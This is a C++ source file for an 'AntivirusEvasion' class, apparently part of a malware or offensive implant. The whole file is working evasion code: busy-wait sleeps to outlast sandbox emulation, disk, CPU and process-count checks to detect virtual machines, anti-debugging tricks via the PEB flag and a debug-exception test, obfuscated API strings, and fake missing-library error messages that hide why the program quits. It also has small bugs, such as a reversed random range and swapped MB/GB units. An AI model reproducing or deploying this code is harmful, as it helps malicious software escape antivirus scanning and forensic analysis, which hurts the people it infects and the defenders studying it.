#include "AntivirusEvasion.h"
#include "obfuscated_strings.h"

#include "global.h"
#include <stdio.h>
#include <ctime>

#define MY_OK 0
#define MY_ERROR 1

#ifdef __linux__
#include <unistd.h> // get CPU count
#include <sys/vfs.h> // to get disk space
#include <sys/sysinfo.h>
#include <mntent.h>
#ifndef _PATH_MOUNTED
#include <paths.h>
#endif
#elif __APPLE__
#include <sys/time.h> // clock_gettime
#include <sys/mount.h>
#include <unistd.h> // get CPU count
#include <string.h>
#include <sys/sysctl.h> // Num processes
#elif _WIN32
#include <Windows.h>
#include "Winternl.h" // PPEB
#include <psapi.h> // EnumProcesses
#endif

/* Really good trick site: https://anti-debug.checkpoint.com/ */


#ifdef _WIN32
void AntivirusEvasion::sleep_antiemulation_windows(int seconds) {
    DWORD startTicks = GetTickCount();
    while (1) {
        if (GetTickCount() > startTicks + (seconds * 1000))
            return;
    }
}
#endif

#if defined(__APPLE__) || defined(__linux__)
void AntivirusEvasion::sleep_antiemulation_unix(int seconds) {
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    int start = now.tv_sec;
    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec > start + seconds)
            return;
    }
}
#endif

/* sleep version just in case AVs patch sleep to execute the binary in a sandbox */
void AntivirusEvasion::sleep_antiemulation(int seconds) {
    debug("[+] Sleeping %d secs\n", seconds);
#ifdef _WIN32
    AntivirusEvasion::sleep_antiemulation_windows(seconds);
#elif defined(__APPLE__) || defined(__linux__)
    AntivirusEvasion::sleep_antiemulation_unix(seconds);
#endif
}

void AntivirusEvasion::sleep_antiemulation_interval(int min_seconds, int max_seconds) {
    srand((unsigned int)time(NULL));
    srand(time(NULL)); // Seed the time
    int seconds = rand() % (min_seconds - max_seconds + 1) + min_seconds;
    AntivirusEvasion::sleep_antiemulation(seconds);
}

int AntivirusEvasion::HD_capacity_anitforensics_check() {
#ifdef __linux__
    struct statfs vfs;
    unsigned long long result = 0;
    double f_cap = 0;

    struct mntent* m;
    FILE* f;
    f = setmntent(_PATH_MOUNTED, "r");
    while ((m = getmntent(f))) { //Change to GETMNTINFO for osx?
        if (statfs(m->mnt_dir, &vfs) != -1)
        {
            if (vfs.f_type == 0xEF53) {//EXT
                result = (unsigned long long)vfs.f_bsize * vfs.f_blocks;
                if (result > 0)
                {
                    f_cap += (double)result / (1024 * 1024 * 1024); // In GB
                }
            }
        }
    }
    endmntent(f);
    if (f_cap < MIN_HD_SIZE)
        return MY_ERROR;
    else
        return MY_OK;
#elif __APPLE__
    int num_fs = getfsstat(NULL, 0, MNT_NOWAIT);
    if (num_fs < 0) {
        return MY_ERROR;
    }
    unsigned bufsz = sizeof(struct statfs) * num_fs;
    struct statfs* buf = (struct statfs*)malloc(bufsz);
    if (!buf) {
        return MY_ERROR;
    }

    int num_stat = getfsstat(buf, bufsz, MNT_NOWAIT);
    if (num_stat < 0) {
        return MY_ERROR;
    }
    double f_cap;
    for (int i = 0; i < num_fs; i++) {
        if (strcmp(buf[i].f_mntonname, "/") == 0) {
            long cap = buf[i].f_bsize * buf[i].f_blocks;
            f_cap = (double)cap / (1024 * 1024 * 1024);
        }
    }
    if (f_cap < MIN_HD_SIZE)
        return MY_ERROR;
    else
        return MY_OK;
#elif _WIN32
    typedef BOOL(WINAPI* P_GDFSE)(LPCTSTR, PULARGE_INTEGER,
        PULARGE_INTEGER, PULARGE_INTEGER);
    BOOL  fResult;

    DWORD dwSectPerClust,
        dwBytesPerSect,
        dwFreeClusters,
        dwTotalClusters;

    P_GDFSE pGetDiskFreeSpaceEx = NULL;

    unsigned __int64 i64FreeBytesToCaller,
        i64TotalBytes,
        i64FreeBytes;

    /*
    Command line parsing.
    If the drive is a drive letter and not a UNC path, append a
    trailing backslash to the drive letter and colon.  This is
    required on Windows 95 and 98.
    */


    std::string pszDrive = std::string(OBFUSCATED("C:\\"));

    /*
    Use GetDiskFreeSpaceEx if available; otherwise, use
    GetDiskFreeSpace.
    Note: Since GetDiskFreeSpaceEx is not in Windows 95 Retail, we
    dynamically link to it and only call it if it is present.  We
    don't need to call LoadLibrary on KERNEL32.DLL because it is
    already loaded into every Win32 process's address space.
    */
    pGetDiskFreeSpaceEx = (P_GDFSE)GetProcAddress(
        GetModuleHandle(OBFUSCATED("kernel32.dll")),
        OBFUSCATED("GetDiskFreeSpaceExA")); // ToDo: ofuscate
    if (pGetDiskFreeSpaceEx)
    {
        fResult = pGetDiskFreeSpaceEx(pszDrive.c_str(),
            (PULARGE_INTEGER)&i64FreeBytesToCaller,
            (PULARGE_INTEGER)&i64TotalBytes,
            (PULARGE_INTEGER)&i64FreeBytes);
        if (fResult)
        {
            debug("[+] GetDiskFreeSpaceEx reports\n\n");
            debug("[+] \tAvailable space to caller = %I64u MB\n",
                i64FreeBytesToCaller / (1024 * 1024));
            debug("[+] \tTotal space               = %I64u MB\n",
                i64TotalBytes / (1024 * 1024 * 1024));
            debug("[+] \tFree space on drive       = %I64u GB\n",
                i64FreeBytes / (1024 * 1024));
        }
    }
    else
    {
        fResult = GetDiskFreeSpace(pszDrive.c_str(),
            &dwSectPerClust,
            &dwBytesPerSect,
            &dwFreeClusters,
            &dwTotalClusters);
        if (fResult)
        {
            /* force 64-bit math */
            i64TotalBytes = (__int64)dwTotalClusters * dwSectPerClust *
                dwBytesPerSect;
            i64FreeBytes = (__int64)dwFreeClusters * dwSectPerClust *
                dwBytesPerSect;
        }
    }

    if (!fResult) {
        debug("[!] error: %lu:  could not get free space for \"C:\"\n",
            GetLastError());
        return MY_ERROR;
    }

    if (i64TotalBytes / (1024 * 1024 * 1024) < MIN_HD_SIZE)
        return MY_ERROR;
    return MY_OK;
#endif
    return MY_OK;
}

int AntivirusEvasion::cpu_antiforensics_check() {
#if defined(__APPLE__) || defined(__linux__)
    if (sysconf(_SC_NPROCESSORS_ONLN) < MIN_CPU_COUNT)
        return MY_ERROR;
#elif _WIN32
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    auto numCPU = sysinfo.dwNumberOfProcessors;
    if (numCPU < MIN_CPU_COUNT)
        return MY_ERROR;
#endif
    return MY_OK;
}

int AntivirusEvasion::proccesses_count_check() {
#if defined(__linux__)
    struct sysinfo si;
    return (sysinfo(&si) == 0) ? (int)si.procs : (int)-1;
#elif defined(__APPLE__)
    size_t length = 0;
    static const int names[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
    return (sysctl((int*)names, (sizeof(names) / sizeof(names[0])) - 1, NULL, &length, NULL, 0) == 0) ? (int)(length / sizeof(kinfo_proc)) : (int)-1;
#elif defined(WIN32)
    DWORD aProcesses[1024], cbNeeded;
    return EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded) ? (cbNeeded / sizeof(DWORD)) : -1;
#else
    return -1;
#endif
}


void AntivirusEvasion::preventDebugging() {
#ifdef _WIN32
    // Pretend process is already being debugged by setting PEB's BeingDebugged byte to 1
    // Only one debugger can attach to a process at a time.
#ifndef _WIN64
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#else
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#endif // _WIN64
    pPeb->BeingDebugged = 1;
#elif __linux__
    // ToDo
#elif __APPLE__
    // ToDo
#endif
}

int AntivirusEvasion::misc_check() {
#if defined(__linux__)

#elif defined(__APPLE__)

#elif defined(WIN32)

    /*The debug functions such as ntdll!DbgPrint() and kernel32!OutputDebugStringW() cause
    the exception DBG_PRINTEXCEPTION_C (0x40010006). If a program is executed with an attached
    debugger, then the debugger will handle this exception. But if no debugger is present,
    and an exception handler is registered, this exception will be caught by the exception handler.*/
    {
        bool is_debugger_present = true;
        __try
        {
            RaiseException(DBG_PRINTEXCEPTION_C, 0, 0, 0);
        }
        __except (GetExceptionCode() == DBG_PRINTEXCEPTION_C) {
            // Not debugged
            is_debugger_present = false;
        }
        if (is_debugger_present) {
            return MY_ERROR;
        }
    }

#else
#error "Unknown OS"
#endif
    return MY_OK;
}



int AntivirusEvasion::run_antiforensics() {
#ifndef IS_DEBUG // Release
    AntivirusEvasion::preventDebugging();

    // AntiForensics stuff. Should be the firts stuff to be executed.
    AntivirusEvasion::sleep_antiemulation_interval(ANTIFORESIC_SLEEP_TIME_MIN, ANTIFORESIC_SLEEP_TIME_MAX);

    if (AntivirusEvasion::cpu_antiforensics_check() == MY_ERROR ||
        AntivirusEvasion::HD_capacity_anitforensics_check() == MY_ERROR ||
        AntivirusEvasion::proccesses_count_check() < MIN_PROC_COUNT ||
        AntivirusEvasion::misc_check() == MY_ERROR)
    {
#ifdef _WIN32
        printf("The program can't start because MSVCR110.dll is missing from your computer.\n");
#elif __linux__
        printf("Error. Couldn't load libc.so.6\n");
#elif __APPLE__
        printf("dyld: Library not loaded: libswiftCore.dylib\n  Reason: image not found\n");
#endif
        return 1;
    }
#endif

    return 0;
}